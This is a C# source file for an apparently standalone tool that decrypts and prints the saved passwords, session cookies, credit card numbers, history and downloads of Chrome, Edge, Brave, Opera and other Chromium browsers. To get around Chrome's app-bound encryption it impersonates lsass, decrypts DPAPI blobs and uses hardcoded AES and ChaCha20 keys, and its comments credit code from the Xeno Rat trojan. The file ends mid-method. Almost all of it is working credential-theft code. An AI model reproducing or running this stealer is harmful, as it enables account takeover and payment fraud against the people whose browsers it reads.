using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Web.Script.Serialization;

public enum MasterPasswordType
{
    v10,
    v20,
    v20_2,
    None
}

namespace chrome_v20_decryption_CSharp
{
    public struct Browser
    {
        public string name;
        public MasterPasswordType loginsMP;
        public MasterPasswordType cookiesMP;
        public MasterPasswordType ccMP;
        public string rootPath;
    }

    internal class Program
    {
        static void Main(string[] args)
        {
            bool getPasswords = false;
            bool getCookies = false;
            bool getHistory = false;
            bool getDownloads = false;
            bool getCreditCards = false;

            List<Chromium.Login> loginData = null;
            List<Chromium.Cookie> cookieData = null;
            List<Chromium.WebHistory> historyData = null;
            List<Chromium.Download> downloadData = null;
            List<Chromium.CreditCard> ccData = null;

            if (args.Length == 0)
            {
                getPasswords = true;
                getCookies = true;
                getHistory = true;
                getDownloads = true;
                getCreditCards = true;
            }
            else
            {
                for (int i = 0; i < args.Length; i++)
                {
                    switch (args[i].ToLower())
                    {

                        case "-p":
                        case "--passwords":
                            getPasswords = true;
                            break;
                        case "-c":
                        case "--cookies":
                            getCookies = true;
                            break;
                        case "-h":
                        case "--history":
                            getHistory = true;
                            break;
                        case "-d":
                        case "--downloads":
                            getDownloads = true;
                            break;
                        case "-cc":
                        case "--creditcards":
                            getCreditCards = true;
                            break;
                    }
                }
            }

            if (getPasswords || getCookies || getCreditCards)
            {
                if (!IsAdmin())
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: Not Running as Administrator!\n");
                    Console.ResetColor();
                    Console.WriteLine("Chrome_v20_decryption_CSharp Must Be Running as Administrator to decrypt passwords, cookies, or credit cards.");
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                    return;
                }
            }

            //Gather Data
            Chromium chromium = new Chromium();
            if (getPasswords) loginData = chromium.GetLoginData();
            if (getCookies) cookieData = chromium.GetCookies();
            if (getHistory) historyData = chromium.GetWebHistory();
            if (getDownloads) downloadData = chromium.GetDownloads();
            if (getCreditCards) ccData = chromium.GetCreditCards();

            //Write Output
            Console.WriteLine("--- chrome_v20_decryption_CSharp Start of Output ---\n");
            if (getPasswords) WriteLogins(loginData);
            if (getCookies) WriteCookies(cookieData);
            if (getHistory) WriteHistory(historyData);
            if (getDownloads) WriteDownloads(downloadData);
            if (getCreditCards) WriteCreditCards(ccData);
            Console.WriteLine("--- chrome_v20_decryption_CSharp End of Output ---\n");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsUserAnAdmin();
        public static bool IsAdmin()
        {
            bool admin = false;
            try
            {
                admin = IsUserAnAdmin();
            }
            catch { }
            return admin;
        }

        private static void WriteLogins(List<Chromium.Login> loginData)
        {
            Console.WriteLine("--- Start of Login Data ---\n");
            if (loginData != null && loginData.Count > 0)
            {
                foreach (var login in loginData)
                {
                    Console.WriteLine($"URL: {login.url}");
                    Console.WriteLine($"Username: {login.username}");
                    Console.WriteLine($"Password: {login.password}\n");
                }
            }
            Console.WriteLine("--- End of Login Data ---\n");
        }

        private static void WriteCookies(List<Chromium.Cookie> cookieData)
        {
            Console.WriteLine("--- Start of Cookie Data ---\n");
            if (cookieData != null && cookieData.Count > 0)
            {
                foreach (var cookie in cookieData)
                {
                    Console.WriteLine($"Host: {cookie.host}");
                    Console.WriteLine($"URL Path: {cookie.path}");
                    Console.WriteLine($"Expires: {DateTimeOffset.FromUnixTimeSeconds(cookie.expires).LocalDateTime}");
                    Console.WriteLine($"Name: {cookie.name}");
                    Console.WriteLine($"Cookie Data: {cookie.value}\n");
                }
            }
            Console.WriteLine("--- End of Cookie Data ---\n");
        }

        private static void WriteHistory(List<Chromium.WebHistory> historyData)
        {
            Console.WriteLine("--- Start of History Data ---\n");
            if (historyData != null && historyData.Count > 0)
            {
                foreach (var record in historyData)
                {
                    Console.WriteLine($"URL: {record.url}");
                    Console.WriteLine($"Title: {record.title}");
                    Console.WriteLine($"Last Visted: {DateTimeOffset.FromUnixTimeSeconds(record.timestamp).LocalDateTime}\n");
                }
            }
            Console.WriteLine("--- End of History Data ---\n");
        }

        private static void WriteDownloads(List<Chromium.Download> downloadData)
        {
            Console.WriteLine("--- Start of Download Data ---\n");
            if (downloadData != null && downloadData.Count > 0)
            {
                foreach (var download in downloadData)
                {
                    Console.WriteLine($"URL: {download.tab_url}");
                    Console.WriteLine($"Path: {download.target_path}\n");
                }
            }
            Console.WriteLine("--- End of Download Data ---\n");
        }

        private static void WriteCreditCards(List<Chromium.CreditCard> ccData)
        {
            Console.WriteLine("--- Start of Credit Card Data ---\n");
            if (ccData != null && ccData.Count > 0)
            {
                foreach (var cc in ccData)
                {
                    Console.WriteLine($"Name On Card: {cc.name}");
                    Console.WriteLine($"Expiration Month: {cc.month}");
                    Console.WriteLine($"Expiratoin Year: {cc.year}");
                    Console.WriteLine($"Card Number: {cc.number}");
                    Console.WriteLine($"Date Modified: {DateTimeOffset.FromUnixTimeSeconds(cc.date_modified).LocalDateTime}\n");
                }
            }
            Console.WriteLine("--- End of Credit Card Data ---\n");
        }
    }

    //This part is taken from Xeno Rat https://github.com/moom825/xeno-rat and has since been heaviliy modified.
    public class Chromium
    {
        private static string local_appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
        private static string roaming_appdata = Environment.GetEnvironmentVariable("APPDATA");

        public static Dictionary<string, Browser> browsers = new Dictionary<string, Browser>
        {
            { "arc", new Browser {
                name = "arc",
                loginsMP = MasterPasswordType.v10,
                cookiesMP = MasterPasswordType.v10,
                ccMP = MasterPasswordType.v10,
                rootPath = $"{local_appdata}\\Packages\\TheBrowserCompany.Arc_ttt1ap7aakyb4\\LocalCache\\Local\\Arc\\User Data"
            }},
            { "vivaldi", new Browser {
                name = "vivaldi",
                loginsMP = MasterPasswordType.v10,
                cookiesMP = MasterPasswordType.v10,
                ccMP = MasterPasswordType.v10,
                rootPath = $"{local_appdata}\\Vivaldi\\User Data"
            }},
            { "google-chrome", new Browser {
                name = "google-chrome",
                loginsMP = MasterPasswordType.v20,
                cookiesMP = MasterPasswordType.v20,
                ccMP = MasterPasswordType.v20,
                rootPath = $"{local_appdata}\\Google\\Chrome\\User Data"
            }},
            { "google-chrome-beta", new Browser {
                name = "google-chrome-beta",
                loginsMP = MasterPasswordType.v20,
                cookiesMP = MasterPasswordType.v20,
                ccMP = MasterPasswordType.v20,
                rootPath = $"{local_appdata}\\Google\\Chrome Beta\\User Data"
            } },
            { "google-chrome-dev", new Browser {
                name = "google-chrome-dev",
                loginsMP = MasterPasswordType.v20,
                cookiesMP = MasterPasswordType.v20,
                ccMP = MasterPasswordType.v20,
                rootPath = $"{local_appdata}\\Google\\Chrome Dev\\User Data"
            }},
            //{ "google-chrome-canary", new Browser {
            //    name = "google-chrome-canary",
            //    loginsMP = MasterPasswordType.v20,
            //    cookiesMP = MasterPasswordType.v20,
            //    ccMP = MasterPasswordType.v20,
            //    rootPath = $"{local_appdata}\\Google\\Chrome SxS\\User Data"
            //}},
            { "microsoft-edge", new Browser {
                name = "microsoft-edge",
                loginsMP = MasterPasswordType.v10,
                cookiesMP = MasterPasswordType.v20_2,
                ccMP = MasterPasswordType.v20_2,
                rootPath = $"{local_appdata}\\Microsoft\\Edge\\User Data"
            }},
            { "brave", new Browser {
                name = "brave",
                loginsMP = MasterPasswordType.v20_2,
                cookiesMP = MasterPasswordType.v20_2,
                ccMP = MasterPasswordType.v20_2,
                rootPath = $"{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data"
            }},
            { "chromium", new Browser {
                name = "chromium",
                loginsMP = MasterPasswordType.v10,
                cookiesMP = MasterPasswordType.v10,
                ccMP = MasterPasswordType.v10,
                rootPath = $"{local_appdata}\\Chromium\\User Data"
            }},
            { "duckduckgo", new Browser {
                name = "duckduckgo",
                loginsMP = MasterPasswordType.None,
                cookiesMP = MasterPasswordType.v10,
                ccMP = MasterPasswordType.None,
                rootPath = $"{local_appdata}\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView"
            }},
            { "opera", new Browser {
                name = "opera",
                loginsMP = MasterPasswordType.v10,
                cookiesMP = MasterPasswordType.v10,
                ccMP = MasterPasswordType.v10,
                rootPath = $"{roaming_appdata}\\Opera Software\\Opera Stable"
            }},
            { "opera-gx", new Browser {
                name = "opera-gx",
                loginsMP = MasterPasswordType.v10,
                cookiesMP = MasterPasswordType.v10,
                ccMP = MasterPasswordType.v10,
                rootPath = $"{roaming_appdata}\\Opera Software\\Opera GX Stable"
            }},
        };

        private string[] profiles = {
                "Default",
                "Profile 1",
                "Profile 2",
                "Profile 3",
                "Profile 4",
                "Profile 5"
        };

        //The next 5 methods are very similar to what can be found in Xeno Rat https://github.com/moom825/xeno-rat
        public List<Login> GetLoginData()
        {
            List<Login> loginList = new List<Login>();
            foreach (var browser in browsers)
            {
                string path = browser.Value.rootPath;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = null;
                if (browser.Value.loginsMP == MasterPasswordType.v10) masterKey = GetV10MasterKey($"{path}\\Local State");
                else if (browser.Value.loginsMP == MasterPasswordType.v20) masterKey = GetV20MasterKey($"{path}\\Local State");
                else if (browser.Value.loginsMP == MasterPasswordType.v20_2) masterKey = GetV20_2MasterKey($"{path}\\Local State");
                else if (browser.Value.loginsMP == MasterPasswordType.None) continue;
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Login> loginData = GetLoginData(browser.Value, profilePath, masterKey);
                        if (loginData == null) continue;
                        loginList.AddRange(loginData);
                    }
                    catch
                    {
                    }
                }
            }
            return loginList;
        }
        public List<Cookie> GetCookies()
        {
            List<Cookie> cookieList = new List<Cookie>();
            foreach (var browser in browsers)
            {
                string path = browser.Value.rootPath;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = null;
                if (browser.Value.cookiesMP == MasterPasswordType.v10) masterKey = GetV10MasterKey($"{path}\\Local State");
                else if (browser.Value.cookiesMP == MasterPasswordType.v20) masterKey = GetV20MasterKey($"{path}\\Local State");
                else if (browser.Value.cookiesMP == MasterPasswordType.v20_2) masterKey = GetV20_2MasterKey($"{path}\\Local State");
                else if (browser.Value.cookiesMP == MasterPasswordType.None) continue;
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Cookie> cookieData = GetCookies(profilePath, masterKey);
                        if (cookieData == null) continue;
                        cookieList.AddRange(cookieData);
                    }
                    catch
                    {
                    }
                }
            }
            return cookieList;
        }
        public List<WebHistory> GetWebHistory()
        {
            List<WebHistory> webHistoryList = new List<WebHistory>();
            foreach (var browser in browsers)
            {
                string path = browser.Value.rootPath;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<WebHistory> webHistoryData = GetWebHistory(profilePath);
                        if (webHistoryData == null) continue;
                        webHistoryList.AddRange(webHistoryData);
                    }
                    catch { }
                }
            }
            return webHistoryList;
        }
        public List<Download> GetDownloads()
        {
            List<Download> downloadsList = new List<Download>();
            foreach (var browser in browsers)
            {
                string path = browser.Value.rootPath;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Download> downloadsData = GetDownloads(profilePath);
                        if (downloadsData == null) continue;
                        downloadsList.AddRange(downloadsData);
                    }
                    catch { }
                }
            }
            return downloadsList;
        }
        public List<CreditCard> GetCreditCards()
        {
            List<CreditCard> creditCardsList = new List<CreditCard>();
            foreach (var browser in browsers)
            {
                string path = browser.Value.rootPath;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = null;
                if (browser.Value.ccMP == MasterPasswordType.v10) masterKey = GetV10MasterKey($"{path}\\Local State");
                else if (browser.Value.ccMP == MasterPasswordType.v20) masterKey = GetV20MasterKey($"{path}\\Local State");
                else if (browser.Value.ccMP == MasterPasswordType.v20_2) masterKey = GetV20_2MasterKey($"{path}\\Local State");
                else if (browser.Value.ccMP == MasterPasswordType.None) continue;
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<CreditCard> creditCardsData = GetCreditCards(profilePath, masterKey);
                        if (creditCardsData == null) continue;
                        creditCardsList.AddRange(creditCardsData);
                    }
                    catch { }
                }
            }
            return creditCardsList;
        }
        private List<Login> GetLoginData(Browser browser, string path, byte[] masterKey)
        {
            List<Login> logins = new List<Login>();
            string[] loginDataNames = { "Login Data", "Login Data For Account" };

            foreach (string ldn in loginDataNames)
            {
                string loginDbPath = Path.Combine(path, ldn);
                if (!File.Exists(loginDbPath)) return null;

                string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
                File.Copy(loginDbPath, tempDbPath, true);
                
                try
                {
                    SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
                    if (!conn.ReadTable("logins"))
                    {
                        logins = null;
                        return null;
                    }

                    for (int i = 0; i < conn.GetRowCount(); i++)
                    {
                        string password = conn.GetValue(i, "password_value");
                        string username = conn.GetValue(i, "username_value");
                        string url = conn.GetValue(i, "action_url");

                        if (password == null || username == null || url == null) continue;

                        password = DecryptPwd(Encoding.Default.GetBytes(password), masterKey);
                        if (string.IsNullOrEmpty(password) || string.IsNullOrEmpty(username))
                        {
                            continue;
                        }
                        logins.Add(new Login(url, username, password));
                    }
                }
                catch (Exception ex)
                {
                    logins = null;
                }

                File.Delete(tempDbPath);
            }
            return logins;
        }


        private List<Cookie> GetCookies(string path, byte[] masterKey)
        {
            string cookieDbPath = Path.Combine(path, "Network", "Cookies");
            if (!File.Exists(cookieDbPath)) return null;

            List<Cookie> cookies = new List<Cookie>();
            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(cookieDbPath, tempDbPath, true);

            try
            {
                SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
                if (!conn.ReadTable("cookies"))
                {
                    cookies = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string host = conn.GetValue(i, "host_key");
                    string name = conn.GetValue(i, "name");
                    string url_path = conn.GetValue(i, "path");
                    string decryptedCookie = conn.GetValue(i, "encrypted_value");
                    string expires_string = conn.GetValue(i, "expires_utc");

                    if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(name) ||
                    string.IsNullOrEmpty(url_path) || string.IsNullOrEmpty(decryptedCookie) ||
                    string.IsNullOrEmpty(expires_string)) continue;

                    long expires_utc = long.Parse(expires_string);
                    decryptedCookie = DecryptCookiePwd(Encoding.Default.GetBytes(decryptedCookie), masterKey);
                    if (string.IsNullOrEmpty(decryptedCookie))
                    {
                        continue;
                    }
                    cookies.Add(new Cookie(
                        host,
                        name,
                        url_path,
                        decryptedCookie,
                        expires_utc
                    ));
                }
            }
            catch
            {
                cookies = null;
            }

            File.Delete(tempDbPath);
            return cookies;
        }

        private List<WebHistory> GetWebHistory(string path)
        {
            string historyDbPath = Path.Combine(path, "History");
            if (!File.Exists(historyDbPath)) return null;

            List<WebHistory> history = new List<WebHistory>();

            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(historyDbPath, tempDbPath, true);

            try
            {
                SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
                if (!conn.ReadTable("urls"))
                {
                    history = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string url = conn.GetValue(i, "url");
                    string title = conn.GetValue(i, "title");
                    string last_visit_time_string = conn.GetValue(i, "last_visit_time");
                    if (string.IsNullOrEmpty(url) || title == null || string.IsNullOrEmpty(last_visit_time_string))
                    {
                        continue;
                    }
                    long last_visit_time = long.Parse(last_visit_time_string);
                    history.Add(new WebHistory(
                        url,
                        title,
                        last_visit_time
                    ));
                }
            }
            catch
            {
                history = null;
            }
            File.Delete(tempDbPath);
            return history;
        }

        private List<Download> GetDownloads(string path)
        {
            string downloadsDbPath = Path.Combine(path, "History");
            if (!File.Exists(downloadsDbPath)) return null;

            List<Download> downloads = new List<Download>();

            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(downloadsDbPath, tempDbPath, true);

            try
            {
                SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
                if (!conn.ReadTable("downloads"))
                {
                    downloads = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {

                    string target_path = conn.GetValue(i, "target_path");
                    string tab_url = conn.GetValue(i, "tab_url");
                    if (string.IsNullOrEmpty(target_path) || tab_url == null)
                    {
                        continue;
                    }
                    downloads.Add(new Download(
                        tab_url,
                        target_path
                    ));
                }
            }
            catch
            {
                downloads = null;
            }

            File.Delete(tempDbPath);
            return downloads;
        }

        private List<CreditCard> GetCreditCards(string path, byte[] masterKey)
        {
            string cardsDbPath = Path.Combine(path, "Web Data");
            if (!File.Exists(cardsDbPath)) return null;

            List<CreditCard> cards = new List<CreditCard>();
            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(cardsDbPath, tempDbPath, true);

            try
            {
                SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
                if (!conn.ReadTable("credit_cards"))
                {
                    cards = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string name_on_card = conn.GetValue(i, "name_on_card");
                    string expiration_month = conn.GetValue(i, "expiration_month");
                    string expiration_year = conn.GetValue(i, "expiration_year");
                    string cardNumber = conn.GetValue(i, "card_number_encrypted");
                    string date_modified_string = conn.GetValue(i, "date_modified");
                    if (name_on_card == null || expiration_month == null || expiration_year == null || string.IsNullOrEmpty(cardNumber) || date_modified_string == null) continue;

                    cardNumber = DecryptPwd(Encoding.Default.GetBytes(cardNumber), masterKey);
                    long date_modified = long.Parse(date_modified_string);
                    cards.Add(new CreditCard(
                        name_on_card,
                        expiration_month,
                        expiration_year,
                        cardNumber,
                        date_modified
                    ));
                }
            }
            catch
            {
                cards = null;
            }

            File.Delete(tempDbPath);
            return cards;
        }

        private static byte[] GetV10MasterKey(string path)
        {
            if (!File.Exists(path))
                return null;

            string content = File.ReadAllText(path);
            if (!content.Contains("os_crypt"))
                return null;

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            dynamic jsonObject = serializer.Deserialize<dynamic>(content);

            if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
            {
                string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));

                return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
            }
            return null;
        }

        private static byte[] GetV20MasterKey(string path)
        {
            try
            {
                if (!File.Exists(path))
                    return null;

                string content = File.ReadAllText(path);
                if (!content.Contains("os_crypt"))
                    return null;

                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic jsonObject = serializer.Deserialize<dynamic>(content);

                if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
                {
                    string encryptedKeyBase64 = jsonObject["os_crypt"]["app_bound_encrypted_key"];
                    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                    byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 4, encryptedKey.Length - 4));

                    var imp = new Impersonate();
                    imp.Impersonatelsass();
                    byte[] keyBlobSystemDecrypted = ProtectedData.Unprotect(masterKey, null, DataProtectionScope.LocalMachine);
                    if (keyBlobSystemDecrypted == null) return null;
                    imp.UnImpersonatelsass();

                    byte[] keyBlobUserDecrypted = ProtectedData.Unprotect(keyBlobSystemDecrypted, null, DataProtectionScope.CurrentUser);
                    if (keyBlobUserDecrypted == null) return null;

                    //Now we parse the key blob
                    KeyBlob kb = ParseKeyBlob(keyBlobUserDecrypted);
                    if (kb == null) return null;

                    return deriveV20MasterKey(kb);
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private static byte[] GetV20_2MasterKey(string path)
        {
            try
            {
                if (!File.Exists(path))
                    return null;

                string content = File.ReadAllText(path);
                if (!content.Contains("os_crypt"))
                    return null;

                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic jsonObject = serializer.Deserialize<dynamic>(content);

                if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
                {
                    string encryptedKeyBase64 = jsonObject["os_crypt"]["app_bound_encrypted_key"];
                    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
                    byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 4, encryptedKey.Length - 4));

                    var imp = new Impersonate();
                    imp.Impersonatelsass();
                    byte[] keyBlobSystemDecrypted = ProtectedData.Unprotect(masterKey, null, DataProtectionScope.LocalMachine);
                    if (keyBlobSystemDecrypted == null) return null;
                    imp.UnImpersonatelsass();

                    byte[] keyBlobUserDecrypted = keyBlobUserDecrypted = ProtectedData.Unprotect(keyBlobSystemDecrypted, null, DataProtectionScope.CurrentUser);
                    if (keyBlobUserDecrypted == null) return null;

                    //Now we parse the key blob
                    KeyBlob2 kb = ParseKeyBlob2(keyBlobUserDecrypted);
                    if (kb == null) return null;

                    return kb.blob2;
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private static string DecryptCookiePwd(byte[] buffer, byte[] masterKey)
        {
            if (masterKey == null) return string.Empty;
            try
            {
                // Extract IV, ciphertext, tag
                byte[] dataIv = new byte[12];
                Array.Copy(buffer, 3, dataIv, 0, 12);

                int encryptedDataLength = buffer.Length - 3 - 12 - 16;
                byte[] encryptedData = new byte[encryptedDataLength];
                Array.Copy(buffer, 3 + 12, encryptedData, 0, encryptedDataLength);

                byte[] dataTag = new byte[16];
                Array.Copy(buffer, buffer.Length - 16, dataTag, 0, 16);

                // Combine ciphertext + tag for BouncyCastle
                byte[] cipherWithTag = new byte[encryptedData.Length + dataTag.Length];
                Array.Copy(encryptedData, 0, cipherWithTag, 0, encryptedData.Length);
                Array.Copy(dataTag, 0, cipherWithTag, encryptedData.Length, dataTag.Length);

                // Set up AES-GCM
                GcmBlockCipher cipher = new GcmBlockCipher(new Org.BouncyCastle.Crypto.Engines.AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(masterKey), 128, dataIv, null);
                cipher.Init(false, parameters); // false = decrypt

                byte[] decrypted = new byte[cipher.GetOutputSize(cipherWithTag.Length)];
                int len = cipher.ProcessBytes(cipherWithTag, 0, cipherWithTag.Length, decrypted, 0);
                cipher.DoFinal(decrypted, len);

                // Skip first 32 bytes of decrypted data
                byte[] resultBytes = new byte[decrypted.Length - 32];
                Array.Copy(decrypted, 32, resultBytes, 0, resultBytes.Length);

                return Encoding.UTF8.GetString(resultBytes);
            }
            catch
            {
                return string.Empty;
            }
        }

        private string DecryptPwd(byte[] buffer, byte[] masterKey)
        {
            if (masterKey == null) return string.Empty;
            try
            {
                byte[] iv = new byte[12];
                Buffer.BlockCopy(buffer, 3, iv, 0, iv.Length);
                byte[] payload = new byte[buffer.Length - 15];
                Buffer.BlockCopy(buffer, 15, payload, 0, payload.Length);
                return DoDecrypt(payload, masterKey, iv);
            }
            catch
            {
                return string.Empty;
            }
        }

        public static string DoDecrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            var sR = string.Empty;
            try
            {
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                var plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.Default.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch
            {
                return string.Empty;
            }

            return sR;
        }

        public class KeyBlob
        {
            public byte[] Header { get; set; }
            public byte Flag { get; set; }
            public byte[] IV { get; set; }
            public byte[] Ciphertext { get; set; }
            public byte[] Tag { get; set; }
            public byte[] EncryptedAesKey { get; set; }
        }

        public static KeyBlob ParseKeyBlob(byte[] blobData)
        {
            if (blobData == null || blobData.Length < 9)
                return null;

            using (MemoryStream ms = new MemoryStream(blobData))
            using (BinaryReader reader = new BinaryReader(ms))
            {
                KeyBlob parsed = new KeyBlob();

                // Read header length (4 bytes, little endian)
                int headerLen = reader.ReadInt32();
                parsed.Header = reader.ReadBytes(headerLen);

                // Read content length
                int contentLen = reader.ReadInt32();

                // Verify total length matches
                if (headerLen + contentLen + 8 != blobData.Length)
                    return null;

                // Read flag (1 byte)
                parsed.Flag = reader.ReadByte();

                if (parsed.Flag == 1 || parsed.Flag == 2)
                {
                    // [flag|iv|ciphertext|tag] = [1|12|32|16]
                    parsed.IV = reader.ReadBytes(12);
                    parsed.Ciphertext = reader.ReadBytes(32);
                    parsed.Tag = reader.ReadBytes(16);
                }
                else if (parsed.Flag == 3)
                {
                    // [flag|encrypted_aes_key|iv|ciphertext|tag] = [1|32|12|32|16]
                    parsed.EncryptedAesKey = reader.ReadBytes(32);
                    parsed.IV = reader.ReadBytes(12);
                    parsed.Ciphertext = reader.ReadBytes(32);
                    parsed.Tag = reader.ReadBytes(16);
                }
                else
                {
                    return null;
                }

                return parsed;
            }
        }

        public class KeyBlob2
        {
            public byte[] blob1 { get; set; }
            public byte[] blob2 { get; set; }
        }

        public static KeyBlob2 ParseKeyBlob2(byte[] blobData)
        {
            if (blobData == null) return null;

            using (MemoryStream ms = new MemoryStream(blobData))
            using (BinaryReader reader = new BinaryReader(ms))
            {
                KeyBlob2 parsed = new KeyBlob2();

                int blob1len = reader.ReadInt32();
                if (blob1len > blobData.Length - 4) return null;
                parsed.blob1 = reader.ReadBytes((int)blob1len);

                int blob2len = reader.ReadInt32();
                if (blob2len > blobData.Length - 4 - blob1len - 4) return null;
                parsed.blob2 = reader.ReadBytes((int)blob2len);
                return parsed;
            }
        }

        public static byte[] ByteXor(byte[] ba1, byte[] ba2)
        {
            if (ba1 == null || ba2 == null)
                throw new ArgumentNullException("Input arrays cannot be null");

            int length = Math.Min(ba1.Length, ba2.Length);
            byte[] result = new byte[length];

            for (int i = 0; i < length; i++)
            {
                result[i] = (byte)(ba1[i] ^ ba2[i]);
            }

            return result;
        }

        public static byte[] deriveV20MasterKey(KeyBlob kb)
        {
            switch (kb.Flag)
            {
                case 1:
                    byte[] aesKey = Convert.FromBase64String("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=");
                    var cipher = new GcmBlockCipher(new AesEngine());
                    var parameters = new AeadParameters(new KeyParameter(aesKey), 128, kb.IV, null);
                    cipher.Init(false, parameters);

                    byte[] ctWithTag;
                    if (kb.Tag != null && kb.Tag.Length > 0)
                    {
                        ctWithTag = new byte[kb.Ciphertext.Length + kb.Tag.Length];
                        Array.Copy(kb.Ciphertext, 0, ctWithTag, 0, kb.Ciphertext.Length);
                        Array.Copy(kb.Tag, 0, ctWithTag, kb.Ciphertext.Length, kb.Tag.Length);
                    }
                    else
                    {
                        ctWithTag = kb.Ciphertext;
                    }

                    byte[] retBytes = new byte[cipher.GetOutputSize(ctWithTag.Length)];
                    int retLen = cipher.ProcessBytes(ctWithTag, 0, ctWithTag.Length, retBytes, 0);
                    int finalLen = cipher.DoFinal(retBytes, retLen);

                    int totalLen = retLen + finalLen;
                    if (totalLen != retBytes.Length)
                    {
                        byte[] finalPlain = new byte[totalLen];
                        Array.Copy(retBytes, 0, finalPlain, 0, totalLen);
                        retBytes = finalPlain;
                    }

                    return retBytes;

                case 2:
                    byte[] chacha20Key = Convert.FromBase64String("6Y831/Th+kM9GTBNwiWAQgkOLR1+6nZw1B9zjQhylmA=");
                    byte[] ctWithTag2 = null;
                    if (kb.Tag != null && kb.Tag.Length > 0)
                    {
                        ctWithTag2 = new byte[kb.Ciphertext.Length + kb.Tag.Length];
                        Array.Copy(kb.Ciphertext, 0, ctWithTag2, 0, kb.Ciphertext.Length);
                        Array.Copy(kb.Tag, 0, ctWithTag2, kb.Ciphertext.Length, kb.Tag.Length);
                    }
                    else
                    {
                        ctWithTag = kb.Ciphertext;
                    }

                    var cipher2 = new ChaCha20Poly1305();
                    var parameters2 = new AeadParameters(new KeyParameter(chacha20Key), 128, kb.IV, null);
                    cipher2.Init(false, parameters2); // false = decrypt

                    byte[] output = new byte[cipher2.GetOutputSize(ctWithTag2.Length)];
                    int len = cipher2.ProcessBytes(ctWithTag2, 0, ctWithTag2.Length, output, 0);

                    int finalLen2;
                    try
                    {
                        finalLen2 = cipher2.DoFinal(output, len);
                    }
                    catch (InvalidCipherTextException)
                    {
                        // Authentication failed
                        return null;
                    }

                    int totalLen2 = len + finalLen2;
                    if (totalLen2 != output.Length)
                    {
                        byte[] finalPlain = new byte[totalLen2];
